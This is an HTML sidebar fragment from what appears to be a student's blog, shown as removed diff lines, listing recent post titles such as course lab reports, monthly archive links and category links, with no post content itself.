-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-    </ul>
-  </div>
-</section>
-
-        <hr>
-    
-        <!-- RECENT POSTS -->
-
-<h5><a href="/">RECENT POSTS</a></h5>
-<div class="widget">
-  <ul>
-    
-    <a href="../../undefined/ics-lab3/">
-      <li>ICS-LAB3-Malloc</li>
-    </a>
-    
-    <a href="../../undefined/ics-lab2/">
-      <li>ICS-LAB2-Attack</li>
-    </a>
-    
-    <a href="../../undefined/ics-lab1/">
-      <li>ICS-LAB1-Coroutine</li>
-    </a>
-    
-    <a href="../../undefined/summary2022fall/">
-      <li>大二上学期总结</li>
-    </a>
-    
-    <a href="../../undefined/20220918/">
-      <li>数学建模小记</li>
-    </a>
-    
-  </ul>
-</div>
-
-
-        <hr>
-    
-        <!-- Archives -->
-
-<h5><a href="/archives/">archives</a></h5>
-<div class="widget">
-  <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2023/01/">January 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2022/09/">September 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2022/08/">August 2022</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2022/06/">June 2022</a><span class="archive-list-count">1</span></li></ul>
-</div>
-
-
-        <hr>
-    
-        <!-- Categories -->
-
-<h5><a href="/categories/">categories</a></h5>
-<div class="widget">
-  <ul>
-    
-    <a href="/categories/#杂谈">
-      <li>杂谈</li>
-    </a>
-    
-    <a href="/categories/#Report">
-      <li>Report</li>
-    </a>
-    
-    <a href="/categories/#Development">
-      <li>Development</li>
-    </a>
-    
-    <a href="/categories/#总结">
-      <li>总结</li>
-    </a>
-    
-    <a href="/categories/#课程论文">
-      <li>课程论文</li>
-    </a>
-    
-  </ul>
-</div>
-
-
-        <hr>
-    
-</div>
-
-
-    
-  </div>
-</div>
 
 
 		<!-- Footer (contains ThemeColor、viewer) -->
